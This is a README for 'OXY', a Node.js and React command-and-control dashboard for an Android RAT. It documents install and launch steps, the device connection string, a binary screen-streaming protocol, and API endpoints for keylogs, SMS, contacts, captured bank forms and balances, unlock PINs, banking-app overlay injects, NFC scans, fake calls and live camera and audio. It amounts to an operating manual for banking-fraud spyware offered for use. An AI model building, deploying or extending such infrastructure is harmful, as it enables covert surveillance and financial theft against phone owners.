# OXY 🦷 — C2 Dashboard

Full-stack React + Node.js dashboard.

## Stack
- **Backend** — Node.js + Express + `ws` + `better-sqlite3`
- **Frontend** — React 18 + Vite + Zustand
- **DB** — SQLite (`oxy.db`, auto-created on first run)

## Project structure
```
oxy/
├── server/          Node.js C2 relay server
│   ├── index.js     Entry — HTTP + dual WebSocket
│   ├── db.js        SQLite schema + all prepared statements
│   ├── state.js     In-memory device/subscriber maps
│   ├── ws/
│   │   ├── device.js    Android device WebSocket handler
│   │   └── dashboard.js Dashboard browser WebSocket handler
│   └── routes/
│       └── api.js   REST API (all /api/* endpoints)
└── client/          React SPA
    └── src/
        ├── store/index.js   Zustand global store
        ├── ws.js            WebSocket singleton (auto-reconnect)
        ├── components/
        │   ├── pages/       Overview, Android, Notifications, Logs
        │   └── device/      LiveScreen, LiveCamera, LiveAudio,
        │                    AppManager, DataExtraction, Financial,
        │                    KeylogPanel, NFCPanel, SecurityPanel,
        │                    DeviceDetail
        └── styles/globals.css  Gold dark theme
```

## Quick start

```bash
# 1 — install all deps
cd oxy
npm install                          # installs root dev deps
npm install --workspace=server       # server deps
npm install --workspace=client       # client deps

# 2 — build the React frontend
npm run build --workspace=client

# 3 — start the server
npm start
# or for dev with hot-reload on both:
npm run dev
```

## Environment variables

| Variable     | Default     | Description                          |
|-------------|-------------|--------------------------------------|
| `PORT`      | `5000`      | Server port                          |
| `DB_PATH`   | `./oxy.db`  | SQLite database path                 |
| `AUTH_TOKEN`| `''`        | Dashboard auth token (empty = open)  |

```bash
AUTH_TOKEN=mysecret PORT=7771 npm start
```

## WebSocket endpoints

| Path             | Who connects      | Protocol                          |
|-----------------|-------------------|-----------------------------------|
| `/ws?device_id=X` | Android RAT     | Binary VNC frames + JSON messages |
| `/dashboard`      | Browser panel   | JSON bidirectional                |

## Android device — connection string
```
ws://YOUR_SERVER_IP:5000/ws?device_id=DEVICE_UNIQUE_ID
```

## Dashboard WebSocket messages

### Browser → Server
```json
{ "type": "command",           "device_id": "X", "action": "TAP", "x": 100, "y": 200 }
{ "type": "subscribe_vnc",     "device_id": "X" }
{ "type": "unsubscribe_vnc",   "device_id": "X" }
{ "type": "subscribe_camera",  "device_id": "X" }
{ "type": "subscribe_audio",   "device_id": "X" }
{ "type": "set_inject",        "device_id": "X", "package_name": "com.bank.app", "enabled": true }
```

### Server → Browser (realtime)
```json
{ "type": "device_list",   "devices": [...] }
{ "type": "device_online", "device_id": "X", "ip": "..." }
{ "type": "device_offline","device_id": "X" }
{ "type": "keylog",        "device_id": "X", "data": "...", "app": "..." }
{ "type": "bank_balance",  "device_id": "X", "data": {...} }
{ "type": "form_capture",  "device_id": "X", "bank": "itau", "data": {...} }
{ "type": "unlock_sequence","device_id": "X", "utype": "PIN", "data": "..." }
{ "type": "vnc_meta",      "device_id": "X", "ts": 1234 }   ← followed by binary JPEG
{ "type": "camera_frame",  "device_id": "X", "data": "base64..." }
{ "type": "audio_chunk",   "device_id": "X", "data": "base64..." }
{ "type": "nfc_scan",      "device_id": "X", "data": {...} }
{ "type": "stats",         "data": { "total_devices":1, "online_devices":1, ... } }
```

## Binary VNC protocol (device → server)
```
[0x01][SIZE_HIGH][SIZE_MID_HIGH][SIZE_MID_LOW][SIZE_LOW][JPEG_BYTES...]
```
Server strips the 5-byte header and relays raw JPEG bytes to subscribed dashboard browsers as binary WebSocket frames, preceded by a `vnc_meta` JSON message identifying the device.

## REST API

```
GET  /api/stats
GET  /api/devices
GET  /api/devices/:id
POST /api/devices/:id/command          { "action": "...", ...params }
GET  /api/devices/:id/keylogs          ?limit=100&offset=0
GET  /api/devices/:id/sms
GET  /api/devices/:id/contacts
GET  /api/devices/:id/banking
GET  /api/devices/:id/unlocks
GET  /api/devices/:id/clipboard
GET  /api/devices/:id/location
GET  /api/devices/:id/apps
GET  /api/devices/:id/plugins
GET  /api/devices/:id/nfc
GET  /api/devices/:id/nfc/last
GET  /api/devices/:id/financial
GET  /api/devices/:id/injects
GET  /api/devices/:id/fakecalls
GET  /api/devices/:id/commands         ?limit=100&offset=0
GET  /api/devices/:id/files            ?path=/sdcard
GET  /api/devices/:id/screenshots
GET  /screenshots/:id                  → image/jpeg
POST /api/devices/:id/apps/:pkg/inject { "enabled": true }
GET  /api/apks
POST /api/apks                         { "name":"...", "url":"...", "size":0 }
GET  /api/financial
```
